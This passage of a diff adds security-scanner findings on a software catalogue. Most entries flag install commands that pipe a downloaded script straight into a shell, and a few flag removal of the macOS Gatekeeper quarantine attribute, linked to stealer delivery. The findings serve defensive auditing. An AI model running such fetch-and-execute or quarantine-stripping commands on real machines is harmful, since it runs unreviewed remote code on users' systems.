+      "evidence": "curl --proto '=https' --tlsv1.2 -LsSf https://github.com/ByteAtATime/oweka/relea",
+      "file_sha256": "6b100ccbea4008a62e765fa7ab87ec1dfd8a0b73590c21540db27d9f44ad42a1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/localm.json",
+      "line": 257,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/Matlan1/localm/master/install.sh | ",
+      "file_sha256": "272e2bd7da1b59883f4089b839b31114a62c2c3210f40c031bf03e98a1e8d04a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/ollajev.json",
+      "line": 853,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/nvkudva/ollajev/main/install.sh | s",
+      "file_sha256": "802cdebf98b87f1bb3941e09ec20bafd12a021d5fee1e22c1b35a9fcf5974ce8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/uv.json",
+      "line": 152,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "a11c4a26dc79a8fc13e5eebdea65efe66ac2d2ec5fec986a533e713312e68e11"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/agentty.json",
+      "line": 96,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/agentty-org/agentty/master/install.",
+      "file_sha256": "63a9eb697512d939870f5c0f4ba0582aae41d8582712fca156a39525c3d65e79"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/sipllm.json",
+      "line": 214,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/ankit1057/sipllm/main/install.sh | ",
+      "file_sha256": "5141a674101b150e767abd8bf66aa83eeebf366b9d7ae0f296cfb8f9533facef"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/bailout.json",
+      "line": 294,
+      "evidence": "curl -fsSL https://bailout.dev/install.sh | bash",
+      "file_sha256": "281d90e3c1c27c7b00e2d205e878bc4505c7a03a77bfdea769e9d85d9d8978d4"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/yana-ai.json",
+      "line": 230,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "a4e08497b675358a64f12c24e66c8ac4974354c9b7281adefb1ae96b1904aafb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/kern.json",
+      "line": 564,
+      "evidence": "curl -fsSL https://kern-baa.pages.dev/install.sh | sh",
+      "file_sha256": "9f72510ea5e3293a2cb203d556957e37cdb525d235a94f451c995eaa8549eb08"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/llamatoaster.json",
+      "line": 171,
+      "evidence": "curl -fsSL https://llamatoaster.com/install.sh | bash",
+      "file_sha256": "f983c7739482ccbfd8f2452478787d531c7d77e050668b4b6038cbba8067fcd1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/killport.json",
+      "line": 221,
+      "evidence": "curl -sL https://bit.ly/killport | sh",
+      "file_sha256": "6a344533a2b0c6cf46a096405a7566f0069bf9e0e382b6fb4492c2d838661f81"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/coddy-agent.json",
+      "line": 647,
+      "evidence": "curl -fsSL https://coddy.dev/install.sh | bash",
+      "file_sha256": "a7403d44b0a1349033c0f6b9be8662b648ed30acc89a153bd9c53477bdad668d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/finance-assistant.json",
+      "line": 350,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/googlarz/finance-assistant/main/ins",
+      "file_sha256": "6d435b794c72c769a4d0b630f3d0ae33948b09b90897bfcf8e4e1194f3e36c28"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/trufflehog.json",
+      "line": 258,
+      "evidence": "curl ... install.sh | sh",
+      "file_sha256": "089844ced29cde48422ce5f32664068ae9065dfe1710a086a6b4c638dbda5dc6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/neoth.json",
+      "line": 314,
+      "evidence": "curl -fsSL .../SRC/install.sh | bash",
+      "file_sha256": "60d87c01689997130007f68d71d3f23386c9c9bd3e0e3357ed717f286792fb26"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/gokin.json",
+      "line": 205,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/ginkida/gokin/main/install.sh | sh",
+      "file_sha256": "dfb2e510772ea3de72b56624a6596c2568778b356944739e90fc3e148cbdac9a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/reticle.json",
+      "line": 397,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/reticlehq/reticle/main/install/inst",
+      "file_sha256": "b0e1a01b90b9e279acabe16eb20c3f3769583af5e7274cbe4dade56b4d6a5d24"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/leviath.json",
+      "line": 364,
+      "evidence": "curl -fsSL https://leviath.dev/install.sh | sh",
+      "file_sha256": "6dedf725c59fecafead958d1558fde9b664a7c84669526a5f71cd8c888e6aa29"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/tilt.json",
+      "line": 94,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/tilt-dev/tilt/master/scripts/instal",
+      "file_sha256": "b4e90810956ca29fa76c57703d7a38c4c3ed36a63db271b293658a9b3dcdb939"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/lain.json",
+      "line": 761,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/spuentesp/lain/main/install.sh | ba",
+      "file_sha256": "8b160dda7cf99c4fda8ce0b1e8e450ca9bd1dfaa9397160444b9c605788ffdda"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/feroxbuster.json",
+      "line": 276,
+      "evidence": "curl ... | bash",
+      "file_sha256": "580a3b2e7a5648f1bd4de77f49e72f01fbfe3a0e925b37f9ad46c0522b0592bf"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/flash.json",
+      "line": 729,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/Natuworkguy/Flash/main/install.sh |",
+      "file_sha256": "cf1e2e88b6c8c3c6a0e7f68ae63e70a519c3a740d2f00c97a0df44c6d3ad2840"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/llamastash.json",
+      "line": 623,
+      "evidence": "curl -fsSL https://llamastash.dev/install.sh | sh",
+      "file_sha256": "db2e7689cfd5de9af0a991890cd306191bc41ea19a5b25456daa5990bdc2f5c5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/open-walnut.json",
+      "line": 1172,
+      "evidence": "curl -fsSL https://github.com/EvanZhang008/open-walnut/releases/latest/download/",
+      "file_sha256": "dee2aa0c3d09e47161e331e7799956e27a8a8daf41d90c95f00b17e13c575b21"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/mangodisk.json",
+      "line": 130,
+      "evidence": "curl -fsSL https://get.mangodisk.app/linux | bash",
+      "file_sha256": "e67bcf5bc0540e3aef17b9130aa012abc7a3284926625db123ea6e91b786abbe"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/nouli.json",
+      "line": 179,
+      "evidence": "curl -fsSL https://standing-desks.github.io/nouli/install.sh | sh",
+      "file_sha256": "96b1bd5ab801fbf8421e62be5a006074c36be54967c7bde72a5b7b97525ff397"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/exe.json",
+      "line": 179,
+      "evidence": "curl -fsSL https://exe.v2core.com/install.sh | sh",
+      "file_sha256": "d2a9ff8294a29c5a35abb6d5f804d13348e332af5b663f8b8da351f42349e017"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/b70-launcher.json",
+      "line": 66,
+      "evidence": "curl -fsSL https://xecores.com/downloads/get.sh | sh",
+      "file_sha256": "f15d81cff218536e5d7b2719b757f535aafb56832b000d788cc18c7990b3da61"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/kashkeshet.json",
+      "line": 81,
+      "evidence": "curl -fsSL https://github.com/sam-mfb/kashkeshet/releases/latest/download/kashke",
+      "file_sha256": "b8353f1969dd2625cab3fcc93088dc5175c98e8f0443db535e8d46ec20b2c35f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/lucinate.json",
+      "line": 298,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/lucinate-ai/lucinate/main/install/l",
+      "file_sha256": "a96d2709f75668deff9121d5874f3d6ce3120185ad08573d98ee6df7d3ed6705"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/buddy.json",
+      "line": 112,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/fiorastudio/buddy/master/install.sh",
+      "file_sha256": "0caa926e5c42cc0fe7d4bbeaeed78bf78509391c162113667b08f80c507c61dd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/wcode.json",
+      "line": 253,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/francis-du/wcode/main/install.sh | ",
+      "file_sha256": "2cee6df91a1887137fda43d1d5be40494892222e09d736570866cb7684146ae7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/evnx.json",
+      "line": 458,
+      "evidence": "curl -fsSL https://dotenv.space/install.sh | bash",
+      "file_sha256": "2ed893f853c537e3121a6e850615074baff87a83b8b5a476f0012fa6f5a42426"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/pegainfer.json",
+      "line": 71,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/pegainfer-project/pegainfer/main/in",
+      "file_sha256": "9e464c8d0d22cf581b194c61fe0d1e5a1651179ce70a9676e62c06bb8f00798d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/scafld.json",
+      "line": 453,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/auscaster/scafld/main/install.sh | ",
+      "file_sha256": "7a9285f90ef68f6ba515f932412072c0a145483e66dc7cb4d52ef71a84bbf91a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/intermcp.json",
+      "line": 534,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/Bharathcoorg/intermcp/main/install.",
+      "file_sha256": "dbec8f3a46d416ceabeb6c8a981b7fcf64601fbf66d44fe016d0443f213a8527"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/navin.json",
+      "line": 215,
+      "evidence": "curl https://navin.live/install -fsS | bash",
+      "file_sha256": "378be6fb13a2338e76003a2485c012bd8211fdf19b9903c40495dab177ac61de"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/cowork-os.json",
+      "line": 459,
+      "evidence": "curl -fsSL https://coworkosapp.com/install.sh | bash",
+      "file_sha256": "f55c743c9a842a5c558ddd6f3663b469b26e833fa5d7516360d3be23b0c4cfd9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/television.json",
+      "line": 171,
+      "evidence": "curl -fsSL https://alexpasmantier.github.io/television/install.sh | bash",
+      "file_sha256": "d61101f2dabb189629de3ca2e7dcdaa94ba696a49638e72eb92ff96aae844ec7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/llmash.json",
+      "line": 381,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/omgitsbase/llmash/main/install.sh |",
+      "file_sha256": "ed9609b530963488b457cf8a806e36cfbeb4b82e7beec2a8fe381d3c7a7b3fb5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/alysiscode.json",
+      "line": 711,
+      "evidence": "curl -LsSf https://raw.githubusercontent.com/AlysisAi/AlysisCode/main/scripts/in",
+      "file_sha256": "2dcc3b1a103b93e77490b503282470d4e4032b450412baa019daa04d3e40dbbb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/puffpaibuildbot.json",
+      "line": 333,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "b2f89f12202cb729ad92e7fbb98f35b75fc20d25f6fe06b227411c0d3495332d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/nika.json",
+      "line": 613,
+      "evidence": "curl -LsSf https://nika.sh/install.sh | sh",
+      "file_sha256": "b99744c0b1f97cb19054c8373c8d7e904acf17d779c2981f4b0240da05482e6c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/memcode.json",
+      "line": 308,
+      "evidence": "curl -fsSL https://memcode.ai/install.sh | sh",
+      "file_sha256": "3793b7515ebf79082381aa743364287e880da2f15206ca6e5ef01833abd639b6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/tokless.json",
+      "line": 66,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/HoangP8/tokless/main/scripts/instal",
+      "file_sha256": "f63d54a7fe7b55e471cbbe5dc15a1c5a4bdcc36da62487b52aa96becab743bed"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/plasmate.json",
+      "line": 210,
+      "evidence": "curl -fsSL https://plasmate.app/install.sh | sh",
+      "file_sha256": "41432b8e5c47fde62fdf585366575a1563c17bfede56ffedc7b993117d0341a3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/atuin.json",
+      "line": 338,
+      "evidence": "curl setup.atuin.sh | sh",
+      "file_sha256": "98f820f4f0137f41a7ddc4d5a828b7967f2307f5c399dd43338a9857112c08e9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/kesha-voice-kit.json",
+      "line": 422,
+      "evidence": "curl -fsSL https://bun.sh/install | bash",
+      "file_sha256": "4ab90583b18bea06768d0afe4503f53b2fed94496775dd4ab8303e5eac4b4ff9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/fitllm-engine.json",
+      "line": 548,
+      "evidence": "curl -fsSL https://fitllm.run/install.sh | sh",
+      "file_sha256": "1a658a545becc8216c063e3a8ce0a131a3cd3f7f9d55d2c017f909ce49fc015a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/lcode.json",
+      "line": 673,
+      "evidence": "curl -fsSL https://nasser1941.github.io/lcode/install.sh | bash",
+      "file_sha256": "3126768292f92a4587f36d5c8781d83e72a06409703080727d6316ac7d6d6f6b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/dbmcp.json",
+      "line": 104,
+      "evidence": "curl -fsSL https://dbmcp.haymon.ai/install.sh | bash",
+      "file_sha256": "0b5232ed2ed24d84201b7d44da1d6791c9e904b8b5422c98a77f6f55f9caef6e"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/quill.json",
+      "line": 160,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "a8ecca0aea04ab17aafd237f5087c1b13a59fea63318f9293318ea8bb492375c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/cc-copilot-bridge.json",
+      "line": 281,
+      "evidence": "curl -fsSL .../install.sh | bash",
+      "file_sha256": "22fefd999fee581e7a97a99af586eb3b37bfe16073c72dd2131c888bb33aa799"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/vestige.json",
+      "line": 66,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/samvallad33/vestige/main/scripts/in",
+      "file_sha256": "1b35ba1e87fd7c38c5dfe7f1808c7e9a5353c428885849568d33d0c464650ae4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/uteke.json",
+      "line": 135,
+      "evidence": "curl -sSL codecora.dev/uteke/install | sh",
+      "file_sha256": "779ef72a9cd79cc084d60d8a6942bbc691c4da7d174abd9f26e03cb3a3acea4f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/android-gpu.json",
+      "line": 146,
+      "evidence": "curl -sL https://raw.githubusercontent.com/AbuZar-Ansarii/Android-GPU/main/setup",
+      "file_sha256": "8debc25b421327d219f6268a6d58c9fcd3470f081d061abcbf2d349dd09a340f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/aria-code.json",
+      "line": 1170,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/artheras/aria-code/main/scripts/ins",
+      "file_sha256": "c433e4d63c00cc61525655e9ae9baa10a56dc26033e2df551e6081668619031f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/zlib.json",
+      "line": 87,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/heartleo/zlib/main/install.sh | sh",
+      "file_sha256": "9d803f1449bbace574a99f25d19a78b0ccbc77de496204bfadaada43a32427d9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/glyd.json",
+      "line": 262,
+      "evidence": "curl -LsSf https://getglyd.com/install.sh | sh",
+      "file_sha256": "dfef0e144040c6b0d679fa58f2e48057db498f2e2ac82dd061d30bd78bd963f6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/croc.json",
+      "line": 342,
+      "evidence": "curl https://getcroc.com | bash",
+      "file_sha256": "2ab8fb093fe39460aba669e222b104419f5ec2f4e5ac9e0277dd78b1c4f74dec"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/overtchat.json",
+      "line": 197,
+      "evidence": "curl -fsSL https://overtchat.com/install | sh",
+      "file_sha256": "be6f00901a2b8f81d3fc82802a7a8e4d1963572d8680cc015b43f4b4cb70b592"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/snowllm.json",
+      "line": 379,
+      "evidence": "curl -fsSL https://snowllm.dev/install.sh | sh",
+      "file_sha256": "76b4c4cdbea7f4575da13362959321933b71e5900529c7e2e9ae60ebd8761185"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/tubecli.json",
+      "line": 274,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/tubecreate/tubecli/main/install.sh ",
+      "file_sha256": "dcf334b919f3171d138a201742e5ba316dd13b934f522804fc2e4cee6597e6d8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/local-transcriber.json",
+      "line": 360,
+      "evidence": "curl -fsSL https://transcriber.teconomix.net/k/github/install.sh | bash",
+      "file_sha256": "d2c50e434f798af8e90ee93cea6d2267acb16da7c8ede47f63455f9989e09bbc"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/linggen.json",
+      "line": 200,
+      "evidence": "curl -fsSL https://linggen.dev/install-app.sh | bash",
+      "file_sha256": "3c5cb44dd615059cc4efb6f90950caf2fbf3299953b105052b845bfdaee59faf"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/system-one-connector.json",
+      "line": 65,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/itsmostafa/system-one-connector/mai",
+      "file_sha256": "e6e94ad6dfb57369432bf6c89f22bfc92272e6ca64a22d50d7a82913f1a39e13"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/my-claude-code.json",
+      "line": 525,
+      "evidence": "curl -fsSL \\\"https://raw.githubusercontent.com/FiredMosquito831/my-claude-code/m",
+      "file_sha256": "22fe655b1b3e8e0962af537b6c57bac70f3c724a2ffb1a67f57e1eea682ae1d0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/claudectl.json",
+      "line": 387,
+      "evidence": "curl ... install.sh | sh",
+      "file_sha256": "0a1c5d3044086cd7a399625a0c9188bf1bd8a01535637aa83863183f80c912fd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/mithril.json",
+      "line": 833,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/GiacomoSaccaggi/mithril/main/instal",
